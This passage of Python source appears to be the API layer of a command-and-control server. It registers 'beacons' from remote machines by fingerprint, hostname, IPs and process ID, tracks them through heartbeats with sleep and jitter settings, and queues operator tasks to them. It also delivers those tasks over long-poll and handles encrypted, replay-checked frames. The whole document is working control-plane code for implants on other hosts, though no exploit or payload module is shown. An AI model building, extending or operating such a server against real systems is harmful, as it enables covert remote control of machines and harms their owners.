        return WorkerStopResponse(status=worker.status, worker=InfrastructureWorkerResponse(**worker_payload))

    @api_router.post("/tasks", response_model=TaskResponse, tags=["tasks"])
    async def create_task(
        payload: TaskCreateRequest,
        request: Request,
        session: DbSession,
        authorization: Annotated[str | None, Header()] = None,
    ) -> TaskResponse:
        authorize_c2_token(settings, authorization)
        try:
            beacon_id = uuid.UUID(payload.beacon_id)
        except ValueError as exc:
            raise HTTPException(
                status_code=status.HTTP_422_UNPROCESSABLE_ENTITY,
                detail="beacon_id must be a UUID",
            ) from exc
        if session.get(Beacon, beacon_id) is None:
            raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail="Beacon not found")

        args = validate_task_timeout(settings, payload.args)
        task = Task(
            beacon_id=beacon_id,
            module=payload.module,
            args=args,
            priority=payload.priority,
            status=TASK_STATUS_QUEUED,
            queued_at=utc_now(),
        )
        session.add(task)
        session.flush()
        try:
            await request.app.state.task_queue_service.enqueue(getattr(request.app.state, "redis_client", None), task)
        except TaskQueueUnavailable:
            session.rollback()
            raise task_queue_unavailable_exception() from None
        session.commit()
        session.refresh(task)

        task_payload = public_task(task)
        await publish_task_event(request.app, settings, "task.queued", task_payload)

        delivered = await build_next_longpoll_task_frame(request.app, settings, beacon_id)
        if delivered is not None:
            frame, dispatched_task_payload = delivered
            if await request.app.state.beacon_longpoll_manager.deliver_frame(beacon_id, frame):
                await publish_task_event(request.app, settings, "task.dispatched", dispatched_task_payload)

        return TaskResponse(**task_payload)

    @api_router.get("/tasks", response_model=TaskListResponse, tags=["tasks"])
    def list_tasks(
        session: DbSession,
        authorization: Annotated[str | None, Header()] = None,
        beacon_id: Annotated[uuid.UUID | None, Query()] = None,
        status_filter: Annotated[TaskStatus | None, Query(alias="status")] = None,
        limit: Annotated[int, Query(ge=1, le=100)] = 50,
    ) -> TaskListResponse:
        authorize_c2_token(settings, authorization)
        query = select(Task).order_by(Task.created_at.desc()).limit(limit)
        if beacon_id is not None:
            query = query.where(Task.beacon_id == beacon_id)
        if status_filter is not None:
            query = query.where(Task.status == status_filter)
        tasks = session.execute(query).scalars().all()
        return TaskListResponse(items=[TaskResponse(**public_task(task)) for task in tasks])

    @api_router.get("/tasks/{task_id}", response_model=TaskResponse, tags=["tasks"])
    def get_task(
        task_id: uuid.UUID,
        session: DbSession,
        authorization: Annotated[str | None, Header()] = None,
    ) -> TaskResponse:
        authorize_c2_token(settings, authorization)
        task = session.get(Task, task_id)
        if task is None:
            raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail="Task not found")
        return TaskResponse(**public_task(task))

    @api_router.delete("/tasks/{task_id}", response_model=TaskResponse, tags=["tasks"])
    async def delete_task(
        task_id: uuid.UUID,
        request: Request,
        session: DbSession,
        authorization: Annotated[str | None, Header()] = None,
    ) -> TaskResponse:
        authorize_c2_token(settings, authorization)
        task = session.get(Task, task_id)
        if task is None:
            raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail="Task not found")
        task = await cancel_task(
            session,
            request.app.state.task_queue_service,
            getattr(request.app.state, "redis_client", None),
            task,
        )
        session.commit()
        session.refresh(task)
        task_payload = public_task(task)
        await publish_task_event(request.app, settings, "task.cancelled", task_payload)
        return TaskResponse(**task_payload)

    @api_router.post("/beacons/register", response_model=BeaconRegistrationResponse, tags=["beacons"])
    async def register_beacon(
        payload: BeaconRegistrationRequest,
        request: Request,
        session: DbSession,
    ) -> BeaconRegistrationResponse:
        now = utc_now()
        beacon_token = generate_beacon_token()
        beacon_token_hash = hash_beacon_token(beacon_token)
        beacon = session.execute(
            select(Beacon).where(Beacon.machine_fingerprint_hash == payload.machine_fingerprint_hash)
        ).scalar_one_or_none()
        created = beacon is None
        if beacon is None:
            beacon = Beacon(
                machine_fingerprint_hash=payload.machine_fingerprint_hash,
                hostname=payload.hostname,
                os=payload.os,
                architecture=payload.architecture,
                internal_ip=payload.internal_ip,
                external_ip=payload.external_ip,
                pid=payload.pid,
                status=BEACON_STATUS_ONLINE,
                sleep_seconds=settings.beacon_default_sleep_seconds,
                jitter=settings.beacon_default_jitter,
                beacon_token_hash=beacon_token_hash,
                beacon_token_issued_at=now,
                transport_mode="rest",
                transport_connected=False,
                transport_last_seen=now,
                first_seen=now,
                last_seen=now,
            )
        else:
            old_status = beacon.status
            beacon.hostname = payload.hostname
            beacon.os = payload.os
            beacon.architecture = payload.architecture
            beacon.internal_ip = payload.internal_ip
            beacon.external_ip = payload.external_ip
            beacon.pid = payload.pid
            beacon.status = BEACON_STATUS_ONLINE
            beacon.beacon_token_hash = beacon_token_hash
            beacon.beacon_token_issued_at = now
            beacon.transport_mode = "rest"
            beacon.transport_connected = False
            beacon.transport_last_seen = now
            beacon.last_seen = now
            record_status_transition(
                session,
                beacon,
                old_status=old_status,
                new_status=BEACON_STATUS_ONLINE,
                reason=BEACON_EVENT_REASON_HEARTBEAT,
                occurred_at=now,
            )

        session.add(beacon)
        session.commit()
        session.refresh(beacon)

        beacon_payload = public_beacon(beacon)
        redis_client = get_redis_client(request)
        event = await publish_operator_event(
            redis_client,
            settings,
            "beacon.registered" if created else "beacon.status.changed",
            data={"beacon": beacon_payload},
            scope={"beacon_id": str(beacon.id)},
        )
        if redis_client is None:
            await request.app.state.operator_realtime_hub.broadcast(event)
        return BeaconRegistrationResponse(
            beacon_id=str(beacon.id),
            beacon_token=beacon_token,
            status=beacon.status,
            sleep=beacon.sleep_seconds,
            jitter=beacon.jitter,
            beacon=BeaconResponse(**beacon_payload),
        )

    @api_router.post("/beacons/{beacon_id}/heartbeat", response_model=BeaconHeartbeatResponse, tags=["beacons"])
    async def heartbeat_beacon(
        beacon_id: uuid.UUID,
        payload: BeaconHeartbeatRequest,
        request: Request,
        session: DbSession,
        authorization: Annotated[str | None, Header()] = None,
    ) -> BeaconHeartbeatResponse:
        beacon = session.get(Beacon, beacon_id)
        if beacon is None:
            raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail="Beacon not found")

        if not verify_beacon_token(bearer_token(authorization), beacon.beacon_token_hash):
            raise beacon_auth_exception()

        now = utc_now()
        old_status = beacon.status
        apply_runtime_metadata(beacon, payload)
        beacon.status = BEACON_STATUS_ONLINE
        beacon.transport_mode = "rest"
        beacon.transport_connected = False
        beacon.transport_last_seen = now
        beacon.last_seen = now
        record_status_transition(
            session,
            beacon,
            old_status=old_status,
            new_status=BEACON_STATUS_ONLINE,
            reason=BEACON_EVENT_REASON_HEARTBEAT,
            occurred_at=now,
        )
        session.add(beacon)
        session.commit()
        session.refresh(beacon)

        beacon_payload = public_beacon(beacon)
        if old_status != BEACON_STATUS_ONLINE:
            await publish_beacon_event(request.app, settings, "beacon.status.changed", beacon_payload)
        await publish_beacon_event(request.app, settings, "beacon.heartbeat", beacon_payload)
        return BeaconHeartbeatResponse(
            status=beacon.status,
            sleep=beacon.sleep_seconds,
            jitter=beacon.jitter,
            beacon=BeaconResponse(**beacon_payload),
        )

    @api_router.get("/beacons/{beacon_id}/poll", response_model=None, tags=["beacons"])
    async def poll_beacon(
        beacon_id: uuid.UUID,
        request: Request,
        authorization: Annotated[str | None, Header()] = None,
        timeout_seconds: Annotated[int | None, Query(ge=1)] = None,
    ) -> Response:
        SessionFactory = session_factory_for_settings(settings)
        with SessionFactory() as session:
            beacon = session.get(Beacon, beacon_id)
            if beacon is None:
                raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail="Beacon not found")
            if not verify_beacon_token(bearer_token(authorization), beacon.beacon_token_hash):
                raise beacon_auth_exception()

        manager: BeaconLongPollManager = request.app.state.beacon_longpoll_manager
        try:
            poll = await manager.register(beacon_id)
        except DuplicateLongPollError as exc:
            raise HTTPException(status_code=status.HTTP_409_CONFLICT, detail=str(exc)) from exc

        with SessionFactory() as session:
            beacon = update_beacon_longpoll_state(session, beacon_id, connected=True)
            session.commit()
            beacon_payload = public_beacon(beacon) if beacon is not None else None
        if beacon_payload is not None:
            await publish_beacon_event(request.app, settings, "beacon.transport.changed", beacon_payload)

        queued_task_frame = await build_next_longpoll_task_frame(request.app, settings, beacon_id)
        if queued_task_frame is not None:
            frame, task_payload = queued_task_frame
            await publish_task_event(request.app, settings, "task.dispatched", task_payload)
            await manager.unregister(beacon_id, poll.id)
            with SessionFactory() as session:
                beacon = update_beacon_longpoll_state(session, beacon_id, connected=False)
                session.commit()
                beacon_payload = public_beacon(beacon) if beacon is not None else None
            if beacon_payload is not None:
                await publish_beacon_event(request.app, settings, "beacon.transport.changed", beacon_payload)
            return Response(content=frame, media_type="application/octet-stream")

        configured_timeout = settings.beacon_longpoll_timeout_seconds
        effective_timeout = (
            min(configured_timeout, timeout_seconds) if timeout_seconds is not None else configured_timeout
        )
        try:
            task_frame = await manager.wait_for_frame(beacon_id, poll.id, timeout_seconds=effective_timeout)
            if task_frame is None:
                return Response(status_code=status.HTTP_204_NO_CONTENT)
            return Response(content=task_frame, media_type="application/octet-stream")
        finally:
            removed = await manager.unregister(beacon_id, poll.id)
            if removed:
                with SessionFactory() as session:
                    beacon = update_beacon_longpoll_state(session, beacon_id, connected=False)
                    session.commit()
                    beacon_payload = public_beacon(beacon) if beacon is not None else None
                if beacon_payload is not None:
                    await publish_beacon_event(request.app, settings, "beacon.transport.changed", beacon_payload)

    @api_router.post("/beacons/{beacon_id}/frame", response_model=None, tags=["beacons"])
    async def submit_beacon_frame(
        beacon_id: uuid.UUID,
        request: Request,
        session: DbSession,
        authorization: Annotated[str | None, Header()] = None,
    ) -> Response | JSONResponse:
        beacon = session.get(Beacon, beacon_id)
        if beacon is None:
            raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail="Beacon not found")
        if not verify_beacon_token(bearer_token(authorization), beacon.beacon_token_hash):
            raise beacon_auth_exception()

        raw_frame = await request.body()
        metadata = frame_metadata(raw_frame)
        decoded = None
        try:
            if len(raw_frame) > settings.beacon_longpoll_max_frame_bytes:
                raise ProtocolError(
                    "FRAME_TOO_LARGE",
                    "HTTP long-poll frame exceeds configured maximum",
                    status_code=status.HTTP_413_REQUEST_ENTITY_TOO_LARGE,
                )
            ensure_nonce_not_replayed(session, metadata)
            decoded = decode_frame(
                raw_frame,
                private_key=c2_protocol_private_key(settings),
                supported_versions=protocol_supported_versions(settings),
                max_frame_bytes=min(settings.protocol_max_frame_bytes, settings.beacon_longpoll_max_frame_bytes),
            )
            validate_longpoll_frame_beacon(decoded, beacon_id)
            active_poll = request.app.state.beacon_longpoll_manager.is_active(beacon_id)
            processed_beacon_id, ack_payload = process_protocol_frame(
                session,
                settings,
                decoded,
                transport_mode="long-poll",
                transport_connected=active_poll,
            )
            dispatched_task_payload = None
            if decoded.message_type == TASK_POLL:
                dispatched_task_payload = await attach_dispatched_task_to_ack(
                    request.app,
                    session,
                    settings,
                    beacon_id=processed_beacon_id,
                    ack_payload=ack_payload,
                )
            record_frame_receipt(session, decoded, beacon_id=processed_beacon_id)
            session.commit()

            if processed_beacon_id is not None:
                beacon = session.get(Beacon, processed_beacon_id)
                if beacon is not None:
                    beacon_payload = public_beacon(beacon)
                    await publish_beacon_event(request.app, settings, "beacon.transport.changed", beacon_payload)
                    if decoded.message_type == HEARTBEAT:
                        await publish_beacon_event(request.app, settings, "beacon.heartbeat", beacon_payload)
            if dispatched_task_payload is not None:
                await publish_task_event(request.app, settings, "task.dispatched", dispatched_task_payload)
            if ack_payload.get("task_event_type") and isinstance(ack_payload.get("task"), dict):
                await publish_task_event(
                    request.app,
                    settings,
                    str(ack_payload["task_event_type"]),
                    ack_payload["task"],
                )
            return encrypted_protocol_response(settings, decoded, ACK, ack_payload)
        except ProtocolError as exc:
            record_protocol_error(session, exc, metadata, beacon_id=beacon_id)
            session.commit()
            if decoded is not None:
                return encrypted_protocol_error_response(settings, decoded, exc)
            return protocol_error_response(exc)
        except TaskQueueUnavailable:
            session.rollback()
            raise task_queue_unavailable_exception() from None

    @api_router.get("/beacons", response_model=BeaconListResponse, tags=["beacons"])
    def list_beacons(
        session: DbSession,
        authorization: Annotated[str | None, Header()] = None,
        status_filter: Annotated[str | None, Query(alias="status", pattern="^(online|offline)$")] = None,
    ) -> BeaconListResponse:
        authorize_c2_token(settings, authorization)
        query = select(Beacon).order_by(Beacon.last_seen.desc())
        if status_filter is not None:
            query = query.where(Beacon.status == status_filter)
        beacons = session.execute(query).scalars().all()
        return BeaconListResponse(items=[BeaconResponse(**public_beacon(beacon)) for beacon in beacons])

    @api_router.get("/beacons/{beacon_id}", response_model=BeaconResponse, tags=["beacons"])
    def get_beacon(
        beacon_id: uuid.UUID,
        session: DbSession,
        authorization: Annotated[str | None, Header()] = None,
    ) -> BeaconResponse:
        authorize_c2_token(settings, authorization)
        beacon = session.get(Beacon, beacon_id)
        if beacon is None:
            raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail="Beacon not found")
        return BeaconResponse(**public_beacon(beacon))

    app.include_router(api_router)
    return app


app = create_app()
